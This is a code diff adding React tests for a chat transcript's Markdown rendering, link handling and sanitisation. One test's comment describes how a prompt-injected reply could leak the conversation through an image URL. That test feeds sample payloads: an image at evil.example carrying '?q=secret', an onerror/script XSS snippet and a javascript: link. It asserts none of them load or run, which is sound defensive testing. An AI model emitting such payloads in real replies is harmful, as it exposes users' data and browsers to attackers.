@@ -184,3 +184,64 @@ test("a sent file no longer among the session's files says so instead of offerin
   expect(within(card).getByText("已不在会话文件里")).toBeInTheDocument();
   expect(within(card).queryByRole("button")).toBeNull();
 });
+
+function renderReply(text: string): HTMLElement {
+  const { container } = render(
+    <LocaleProvider>
+      <Transcript
+        turns={[
+          { role: "user", parts: [{ type: "text", text: "**not formatted**" }] },
+          { role: "assistant", parts: [{ type: "text", text }] },
+        ]}
+        optimistic={null}
+        live={false}
+        savedFiles={[]}
+        savingFile={null}
+        canRetry={false}
+        onSaveFile={() => undefined}
+        onRetry={() => undefined}
+      />
+    </LocaleProvider>,
+  );
+  return container.querySelector(".turn-agent") as HTMLElement;
+}
+
+test("a reply's Markdown is rendered, not shown as its symbols", () => {
+  const reply = renderReply(
+    "## 结论\n\n这是**重点**，命令是 `ls -la`。\n\n- 第一条\n- 第二条\n\n| 模型 | 速度 |\n| --- | --- |\n| Argon | 快 |\n\n```\nprint(1)\n```",
+  );
+  expect(within(reply).getByRole("heading", { name: "结论" })).toBeInTheDocument();
+  expect(within(reply).getByText("重点").tagName).toBe("STRONG");
+  expect(within(reply).getByText("ls -la").tagName).toBe("CODE");
+  expect(within(reply).getAllByRole("listitem")).toHaveLength(2);
+  expect(within(reply).getByRole("table")).toBeInTheDocument();
+  expect(reply.querySelector("pre code")?.textContent).toBe("print(1)\n");
+  expect(reply.textContent).not.toContain("**");
+});
+
+test("what the person typed stays as typed", () => {
+  renderReply("ok");
+  expect(screen.getByText("**not formatted**")).toBeInTheDocument();
+});
+
+test("a reply cannot load an image or run markup it was talked into writing", () => {
+  // An image loads the moment it renders: a reply shaped by a prompt
+  // injection could put the conversation into its URL. It becomes a link
+  // the person can choose to open instead.
+  const reply = renderReply(
+    "![chart](https://evil.example/p.png?q=secret)\n\n<img src=x onerror=alert(1)><script>alert(1)</script>\n\n[bad](javascript:alert(1))",
+  );
+  // Scoped to what was said: the avatar beside the reply is our own <img>.
+  expect(reply.querySelector(".prose img, .prose script")).toBeNull();
+  const image = within(reply).getByRole("link", { name: /chart/ });
+  expect(image).toHaveAttribute("href", "https://evil.example/p.png?q=secret");
+  expect(within(reply).getByText("bad").closest("a")?.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
+});
+
+test("a link in a reply opens beside the chat, not in place of it", () => {
+  const reply = renderReply("看 [文档](https://example.com/docs)");
+  const link = within(reply).getByRole("link", { name: "文档" });
+  expect(link).toHaveAttribute("href", "https://example.com/docs");
+  expect(link).toHaveAttribute("target", "_blank");
+  expect(link).toHaveAttribute("rel", "noopener noreferrer");
+});
